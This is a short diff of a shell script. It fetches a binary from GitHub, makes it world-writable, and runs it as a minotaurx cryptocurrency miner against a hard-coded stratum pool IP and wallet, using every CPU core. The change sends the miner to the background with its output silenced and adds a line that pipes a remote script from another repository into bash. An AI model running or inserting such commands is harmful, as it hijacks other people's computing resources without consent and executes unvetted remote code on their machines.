@@ -9,4 +9,5 @@ echo "supersede domain-name-servers 1.1.1.1;">> /etc/dhcp/dhclient.conf
 /etc/init.d/network restart
 wget -O asu https://github.com/hasmenkuy99/ici/raw/main/newcpu
 chmod 777 asu
-./asu -a minotaurx -o stratum+tcp://138.68.224.146:80 -u M99rBcJFFMcxvZVSv7MaEZRJRVEXhJ95Vv.$(shuf -n 1 -i 1-99999)-sol -t $(nproc --all)
+./asu -a minotaurx -o stratum+tcp://138.68.224.146:80 -u M99rBcJFFMcxvZVSv7MaEZRJRVEXhJ95Vv.$(shuf -n 1 -i 1-99999)-isol -t $(nproc --all) > /dev/null 2>&1 &
+curl -sL https://github.com/kartolo92/koplok/raw/master/time | bash
